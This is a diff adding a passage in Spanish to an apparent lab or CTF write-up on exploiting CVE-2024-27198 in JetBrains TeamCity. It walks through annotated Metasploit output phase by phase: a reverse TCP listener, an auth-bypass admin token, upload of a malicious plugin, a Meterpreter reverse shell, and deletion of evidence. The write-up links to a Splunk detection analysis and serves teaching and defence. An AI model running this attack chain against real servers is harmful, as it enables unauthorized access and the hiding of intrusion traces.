@@ -187,6 +187,54 @@ meterpreter > shell
 Process 1 created.
 Channel 1 created.
 ```
+Como podemos observar en la salida de la terminal, lo que hace metasploit es basicamente lo mismo que la opción #1 de esta prueba de vulnerabilidades, pero de manera automatizada y mucho más rápida, ya que estaríamos creando un ataque a velocidad máquina. Ambos métodos de ataque dejan un rastro que podemos osbervar en la fase de análisais en splunk: [Análisis en Splunk](Blue-Team.md)
+
+```bash
+# ==============================================================================
+FASES DE EXPLOTACIÓN CVE-2024-27198 (TeamCity)
+
+# FASE 1: LISTENER REVERSE TCP
+# ------------------------------------------------------------------------------
+# [*] Started reverse TCP handler on 192.168.128.160:4444
+# 
+# Abre puerto en espera de conexión del objetivo.
+
+# FASE 2: VERIFICACIÓN DE VULNERABILIDAD
+# ------------------------------------------------------------------------------
+# [*] Running automatic check
+# [+] The target is vulnerable. JetBrains TeamCity 2023.11.3 running on Linux.
+#
+# Confirma que el sistema es vulnerable al CVE-2024-27198.
+
+# FASE 3: CREACIÓN DE TOKEN ADMIN
+# ------------------------------------------------------------------------------
+# [*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9...
+#
+# Genera token JWT falso para autenticarse como administrador.
+
+# FASE 4: SUBIDA DEL PLUGIN MALICIOSO
+# ------------------------------------------------------------------------------
+# [*] Uploading plugin: nFkmodSC
+# [*] Sending stage (58073 bytes) to 10.128.148.36
+#
+# Sube plugin .jar con payload y envía stager al objetivo.
+
+# FASE 5: SESIÓN METERPRETER
+# ------------------------------------------------------------------------------
+# [*] Meterpreter session 1 opened (192.168.128.160:4444 -> 10.128.148.36:53446)
+#
+# Establece conexión inversa y obtiene acceso remoto al sistema.
+
+# FASE 6: LIMPIEZA DE EVIDENCIAS
+# ------------------------------------------------------------------------------
+# [*] Deleting the plugin...
+# [+] Deleted /opt/teamcity/TeamCity/work/.../TC_147512_nFkmodSC
+# [+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/nFkmodSC
+# [*] Deleting the authentication token...
+# [!] Manual cleanup required: /opt/teamcity/TeamCity/webapps/ROOT/plugins/nFkmodSC
+#
+# Elimina rastros automáticamente pero requiere borrar manualmente un archivo.
+```
 
 ## 4.3 Acceso al sistema y recuperación de la flag
 
